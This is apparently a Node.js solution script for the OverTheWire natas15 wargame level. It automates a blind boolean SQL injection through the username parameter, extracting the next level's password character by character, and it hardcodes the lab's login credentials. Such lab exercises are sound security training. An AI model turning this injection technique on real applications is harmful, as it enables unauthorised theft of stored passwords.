const axios = require("axios");

let url = "http://natas15.natas.labs.overthewire.org/index.php?";
const auth = {
  username: "natas15",
  password: "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB",
};

console.log("url:" + url);
console.log("Brute forcing password...");

const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
const password = [];
// http://natas15.natas.labs.overthewire.org/index.php?username=natas16"+and+substring(password,1,1)="T"%23&debug
const checkPassword = async (password, at) => {
  //console.log(url);
  url =
    `http://natas15.natas.labs.overthewire.org/index.php?username=natas16"+and+binary(substring(password,` +
    at +
    `,1))="` +
    password +
    `&debug`;

  const response = await axios.post(url, {}, { auth: auth });
  if (response.data.includes("This user exists.")) {
    return true;
  }
};

const bruteForce = async () => {
  for (j = 1; j <= 32; j++) {
    // loop through the characters
    for (let i = 0; i < chars.length; i++) {
      newPass = password.join("") + chars[i];
      //console.log("Trying: " + newPass);
      if (await checkPassword(chars[i], j)) {
        console.log(
          "Found " +
            j +
            " character: " +
            chars[i] +
            " Current password:" +
            newPass
        );
        password.push(chars[i]);
        break;
      }
    }
  }

  console.log("Password found: " + password.join(""));
};

bruteForce();
